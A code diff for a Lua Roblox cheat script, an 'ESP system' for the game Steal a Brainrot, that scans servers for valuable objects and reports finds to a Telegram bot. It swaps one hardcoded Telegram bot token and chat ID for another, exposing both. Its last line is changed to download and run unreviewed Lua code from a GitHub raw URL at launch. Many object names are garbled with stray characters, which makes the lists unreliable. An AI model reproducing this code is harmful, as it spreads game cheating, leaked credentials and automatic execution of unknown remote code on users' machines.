@@ -31,33 +31,37 @@ local SCANNER_SETTINGS = {
 
 -- Настройки Telegram ботов
 local TG_MAIN = {
-    Token = "8158106101:AAGTaP3CEjnWh1rjNjj7UlqfJisani8Gwz8",
-    ChatId = "1090955422",
+    Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
+    ChatId = "1072158346",
     Enabled = true,
     ImportantObjects = {
-        ["Pot Hotspdddot"] = true,
+        ["Secret Lucky Block"] = true,
+        ["Pot H77otspot"] = true,
         ["La Grande Combinasion"] = true,
         ["Garama and Madundung"] = true,
         ["Nuclearo Dinossauro"] = true,
+        ["Chicleteira Bicicleteira"] = true,
         ["Dragon Cannelloni"] = true,
         ["Los Combinasionas"] = true,
         ["Los Hotspotsitos"] = true,
         ["Esok Sekolah"] = true,
         ["La Supreme Combinasion"] = true,
-        ["Nooo My Hodsadadatspot"] = true,
+        ["Nooo My Hotspot"] = true,
         ["Ketupat Kepat"] = true,
-        ["Nofddsfoo My Hotspot"] = true,
+        ["Nooo My Hotspot"] = true,
         ["Spaghetti Tualetti"] = true,
         ["Strawberry Elephant"] = true,
         ["Ketchuru and Musturu"] = true,
+        ["hh"] = true,
         ["La Kark7658erkar Combinasion"] = true,
         ["Tralaledon"] = true,
         ["Los Bros"] = true,
+        ["gg"] = true,
+        ["Las sis"] = true,
+        ["Celularcini Viciosini"] = true,
         ["La Extinct Grande"] = true,
         ["Los Chicleteiras"] = true,
-        ["Las Sis"] = true,
-        ["Tacorita Bicicleta"] = true,
-        ["Tictac Sahur"] = true
+        ["Tacorita Bicicleta"] = true
     }
 }
 
@@ -84,13 +88,13 @@ end
 
 -- Доходы объектов (все значения в /s)
 local OBJECT_INCOME = {
-    ["La Vacca Saturno Saturnita"] = "250K/s",
+    ["La Vacca Saturno Saturnita"] = "300K/s",
     ["Chimpanzini Spiderini"] = "325K/s",
     ["Los Tralaleritos"] = "500K/s",
     ["Las Tralaleritas"] = "625K/s",
     ["Graipuss Medussi"] = "1M/s",
     ["Torrtuginni Dragonfrutini"] = "350K/s",
-    ["Pot Hotspot"] = "2.5M/s",
+    ["Pot Hotsp666ot"] = "2.5M/s",
     ["La Grande Combinasion"] = "10M/s",
     ["Garama and Madundung"] = "50M/s",
     ["Secret Lucky Block"] = "???/s",
@@ -108,17 +112,16 @@ local OBJECT_INCOME = {
     ["Nooo My Hotspot"] = "1.5M/s",
     ["Spaghetti Tualetti"] = "60M/s",
     ["Strawberry Elephant"] = "250M/s",
-    ["Ketupat Kepat"] = "35M/s",
     ["Ketchuru and Musturu"] = "42.5M/s",
-    ["Los Nooo My Hotssffsdsdpotsitos"] = "5M/s",
+    ["Los Nooo My Hotspotsitos"] = "5M/s",
     ["La Kark767erkar Combinasion"] = "50M/s",
-    ["Tralaledon"] = "27.5M/s",
-    ["Los Bros"] = "24M/s",
+    ["Tralaledon"] = "50M/s",
+    ["Los Bros"] = "27.5M/s",
+    ["Las Sis"] = "17.5M/s",
+    ["Celularcini Viciosini"] = "22.5M/s",
     ["La Extinct Grande"] = "23.5M/s",
     ["Los Chicleteiras"] = "7M/s",
-    ["Las Sis"] = "18M/s",
-    ["Tacorita Bicicleta"] = "16.5M/s",
-    ["Tictac Sahur"] = "37M/s"
+    ["Tacorita Bicicleta"] = "16.5M/s"
 }
 
 -- Множители мутаций и трейтов
@@ -147,17 +150,7 @@ local TRAIT_MULTIPLIERS = {
     ["Bubblegum"] = 4,
     ["Cometstruck"] = 3.5,
     ["Galactic"] = 4,
-    ["Explosive"] = 4,
-    ["Paint"] = 6,
-    ["Brazil"] = 6,
-    ["Matteo Hat"] = 3.5,
-    ["Rain"] = 1.5,
-    ["UFO"] = 3,
-    ["Skeleton"] = 4,
-    ["Spider"] = 4.5,
-    ["Sombrero"] = 5
-    
-    
+    ["Explosive"] = 4
 }
 
 -- Эмодзи для объектов
@@ -168,10 +161,10 @@ local OBJECT_EMOJIS = {
     ["Las Tralaleritas"] = "🌸",
     ["Graipuss Medussi"] = "🦑",
     ["Torrtuginni Dragonfrutini"] = "🐉",
-    ["Pot Hotspot"] = "📱",
+    ["Pot Ho666tspot"] = "📱",
     ["La Grande Combinasion"] = "❗️",
     ["Garama and Madundung"] = "🥫",
-    ["Secret Lucky Block"] = "⬛️",
+    ["hff"] = "⬛️",
     ["Dragon Cannelloni"] = "🐲",
     ["Nuclearo Dinossauro"] = "🦕",
     ["Las Vaquitas Saturnitas"] = "👦",
@@ -181,21 +174,22 @@ local OBJECT_EMOJIS = {
     ["Los Hotspotsitos"] = "☎️",
     ["Esok Sekolah"] = "🏠",
     ["Nooo My Hotspot"] = "👽",
+    ["Job Job Job Sahur"] = "⬜️",
     ["La Supreme Combinasion"] = "🔫",
     ["Admin Lucky Block"] = "🆘",
-    ["Ketupat Kepat"] = "🍏",
+    ["Ketupat Kepat"] = "⚰️",
     ["Strawberry Elephant"] = "🐘",
     ["Spaghetti Tualetti"] = "🚽",
     ["Ketchuru and Musturu"] = "🍾",
-    ["Los Nooo My Hotspdffsfsfotsitos"] = "🥔",
+    ["hh"] = "🥔",
     ["La Kark666erkar Combinasion"] = "🥊",
     ["Tralaledon"] = "🦈",
     ["Los Bros"] = "✊",
-    ["La Extinct Grande"] = "🩻", 
-    ["Los Chicleteiras"] = "🚳",
-    ["Las Sis"] = "👧",
-    ["Tacorita Bicicleta"] = "🌮",
-    ["Tictac Sahur"] = "🕰️"
+    ["Las Sis"] = "👩",
+    ["Celularcini Viciosini"] = "🦾",
+    ["La Extinct Grande"] = "🦴",
+    ["Los Chicleteiras"] = "💰",
+    ["Tacorita Bicicleta"] = "🌮"
 }
 
 -- Эмодзи для мутаций
@@ -217,10 +211,10 @@ local OBJECT_NAMES = {
     "Las Tralaleritas",
     "Graipuss Medussi",
     "Torrtuginni Dragonfrutini",
-    "Pot Hotspot",
+    "Pot Ho566tspot",
     "La Grande Combinasion",
     "Garama and Madundung",
-    "Secret Lucksfsfsfy Block",
+    "Sec555ret Lucky Block",
     "Dragon Cannelloni",
     "Nuclearo Dinossauro",
     "Las Vaquitas Saturnitas",
@@ -230,21 +224,22 @@ local OBJECT_NAMES = {
     "Los Hotspotsitos",
     "Esok Sekolah",
     "Nooo My Hotspot",
+    "Job Job Job Sahur",
     "La Supreme Combinasion",
     "Admin Lucky Block",
     "Ketupat Kepat",
     "Strawberry Elephant",
     "Spaghetti Tualetti",
     "Ketchuru and Musturu",
-    "Los Nooo Mysffsfsf Hotspotsitos",
+    "Los Nooo My Ho7tos",
     "La Kark56656erkar Combinasion",
     "Los Bros",
     "Tralaledon",
+    "Las Sis",
+    "Celularcini Viciosini",
     "La Extinct Grande",
     "Los Chicleteiras",
-    "Las Sis",
-    "Tacorita Bicicleta",
-    "Tictac Sahur"
+    "Tacorita Bicicleta"
 }
 
 -- Системные переменные
@@ -767,4 +762,4 @@ print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
-loadstring(game:HttpGet('https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua'))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
